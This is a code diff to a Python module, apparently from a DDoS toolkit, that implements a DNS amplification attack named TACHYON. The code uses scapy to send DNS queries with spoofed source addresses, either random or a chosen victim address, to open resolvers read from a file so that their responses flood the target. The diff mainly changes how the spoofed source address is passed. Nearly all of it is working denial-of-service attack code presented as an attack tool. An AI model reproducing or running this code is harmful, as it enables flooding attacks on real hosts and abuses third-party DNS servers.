@@ -27,7 +27,7 @@ def randIP():
     ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
     return ip
 
-def dnsize(ip, port, rounds, source = None):
+def dnsize(ip, port, rounds, address_dict):
     n=0
     try: # (DNS) Amplification attack uses publically accessible DNS servers to flood a target with DNS response traffic
         with open(dns_file) as f: # extract OpenDNS servers from file
@@ -42,15 +42,15 @@ def dnsize(ip, port, rounds, source = None):
                     for j in dns_d:
                         p_num += 1
 
-                        if source is None:
+                        if address_dict['source'] is None:
                             src_ip = randIP() # ip source spoofed on each packet sent
                         else:
-                            src_ip = source
+                            src_ip = address_dict['source']
 
                         packet = IP(src=src_ip, dst=j, ttl=ttl) / UDP(sport=port) / DNS(rd=1, qd=DNSQR(qname=qname, qtype=i))
                         try:
                             send(packet, verbose=0) # not using sr1 because non-replies are required
-                            print(("[Info] [AI] [TACHYON] Lasered 'crystal' [{}]".format(p_num))+" IS BEING REFLECTED by ["+str(j)+"] using DNS type: "+str(i)+" -> [AMPLIFYING!]")
+                            # print(("[Info] [AI] [TACHYON] Lasered 'crystal' [{}]".format(p_num))+" IS BEING REFLECTED by ["+str(j)+"] using DNS type: "+str(i)+" -> [AMPLIFYING!]")
                         except:
                             print(("[Info] [AI] [TACHYON] Lasered 'crystal' [{}]".format(p_num))+" HAS FAILED to be reflected by ["+str(j)+"] using DNS type: "+str(i)+" -> [PASSING!]")
             except:
@@ -59,7 +59,7 @@ def dnsize(ip, port, rounds, source = None):
         print("[Error] [AI] [TACHYON] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class TACHYON(object):
-    def attacking(self, target, rounds, source=None):
+    def attacking(self, target, rounds, address_dict):
         print("[Info] [AI] DNS Amplification (TACHYON) is ready to fire: [" , rounds, "crystals ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -83,4 +83,4 @@ class TACHYON(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [TACHYON] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        dnsize(ip, port, rounds, source) # attack with TACHYON using threading
+        dnsize(ip, port, rounds, address_dict) # attack with TACHYON using threading
